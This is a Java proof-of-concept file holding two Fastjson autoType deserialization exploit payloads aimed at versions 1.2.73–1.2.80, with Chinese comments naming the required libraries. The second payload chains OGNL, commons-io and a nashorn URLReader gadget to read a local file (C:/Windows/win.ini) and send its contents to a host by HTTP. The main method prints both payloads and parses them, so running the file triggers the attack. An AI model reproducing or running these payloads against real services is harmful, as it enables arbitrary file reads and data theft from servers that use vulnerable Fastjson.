package test;

import com.alibaba.fastjson.JSON;

public class Fastjson20_ajt_ognl_io_read_httplog {
    public static void main(String[] args){
    	
        //依赖1.2.73-1.2.80，依赖aspectjtools  ognl-3.2.21  commons-io-2.2
    	String poc1 = "[{\r\n"
    			+ "		\"@type\": \"java.lang.Exception\",\r\n"
    			+ "		\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\"\r\n"
    			+ "	},\r\n"
    			+ "	{\r\n"
    			+ "		\"@type\": \"java.lang.Class\",\r\n"
    			+ "		\"val\": {\r\n"
    			+ "			\"@type\": \"java.lang.String\" {\r\n"
    			+ "				\"@type\": \"java.util.Locale\",\r\n"
    			+ "				\"val\": {\r\n"
    			+ "					\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "					{\r\n"
    			+ "						\"@type\": \"java.lang.String\"\r\n"
    			+ "						\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException\",\r\n"
    			+ "						\"newAnnotationProcessorUnits\": [{}]\r\n"
    			+ "					}\r\n"
    			+ "				}\r\n"
    			+ "			},\r\n"
    			+ "			{\r\n"
    			+ "				\"x\": {\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit\",\r\n"
    			+ "					\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
    			+ "					\"fileName\": \"aaa\"\r\n"
    			+ "				}\r\n"
    			+ "			}]";

    	//http带出
    	String poc2 = "{\r\n"
    			+ "	\"su14\": {\r\n"
    			+ "		\"@type\": \"java.lang.Exception\",\r\n"
    			+ "		\"@type\": \"ognl.OgnlException\"\r\n"
    			+ "	},\r\n"
    			+ "	\"su15\": {\r\n"
    			+ "		\"@type\": \"java.lang.Class\",\r\n"
    			+ "		\"val\": {\r\n"
    			+ "			\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "			{\r\n"
    			+ "				\"@type\": \"java.lang.String\"\r\n"
    			+ "				\"@type\": \"ognl.OgnlException\",\r\n"
    			+ "				\"_evaluation\": \"\"\r\n"
    			+ "			}\r\n"
    			+ "		},\r\n"
    			+ "		\"su16\": {\r\n"
    			+ "			\"@type\": \"ognl.Evaluation\",\r\n"
    			+ "			\"node\": {\r\n"
    			+ "				\"@type\": \"ognl.ASTMethod\",\r\n"
    			+ "				\"p\": {\r\n"
    			+ "					\"@type\": \"ognl.OgnlParser\",\r\n"
    			+ "					\"stream\": {\r\n"
    			+ "						\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\r\n"
    			+ "						\"delegate\": {\r\n"
    			+ "							\"@type\": \"org.apache.commons.io.input.ReaderInputStream\",\r\n"
    			+ "							\"reader\": {\r\n"
    			+ "								\"@type\": \"jdk.nashorn.api.scripting.URLReader\",\r\n"
    			+ "								\"url\": {\r\n"
    			+ "									\"@type\": \"java.lang.String\" {\r\n"
    			+ "										\"@type\": \"java.util.Locale\",\r\n"
    			+ "										\"val\": {\r\n"
    			+ "											\"@type\": \"com.alibaba.fastjson.JSONObject\",\r\n"
    			+ "											{\r\n"
    			+ "												\"@type\": \"java.lang.String\"\r\n"
    			+ "												\"@type\": \"java.util.Locale\",\r\n"
    /*http*/	+ "												\"language\": \"http://127.0.0.1:5667/?test\",\r\n"
    			+ "												\"country\": {\r\n"
    			+ "													\"@type\": \"java.lang.String\" [{\r\n"
    			+ "														\"@type\": \"org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit\",\r\n"
   /*带出文件*/	+ "														\"fileName\": \"C:/Windows/win.ini\"\r\n"
    			+ "													}]\r\n"
    			+ "\r\n"
    			+ "												}\r\n"
    			+ "											}\r\n"
    			+ "										},\r\n"
    			+ "										\"charsetName\": \"UTF-8\",\r\n"
    			+ "										\"bufferSize\": 1024\r\n"
    			+ "									},\r\n"
    			+ "									\"boms\": [{\r\n"
    			+ "										\"@type\": \"org.apache.commons.io.ByteOrderMark\",\r\n"
    			+ "										\"charsetName\": \"UTF-8\",\r\n"
    			+ "										\"bytes\": [\r\n"
    			+ "											36\r\n"
    			+ "										]\r\n"
    			+ "									}]\r\n"
    			+ "								}\r\n"
    			+ "							}\r\n"
    			+ "						}\r\n"
    			+ "					},\r\n"
    			+ "					\"su17\": {\r\n"
    			+ "						\"$ref\": \"$.su16.node.p.stream\"\r\n"
    			+ "					},\r\n"
    			+ "					\"su18\": {\r\n"
    			+ "						\"$ref\": \"$.su17.bOM.bytes\"\r\n"
    			+ "					}\r\n"
    			+ "				}";
    	
    	System.out.println(poc1);
    	System.out.println(poc2);
        try {
            JSON.parseObject(poc1);
        } catch (Exception e){}
        JSON.parseObject(poc2);

        

    }
}
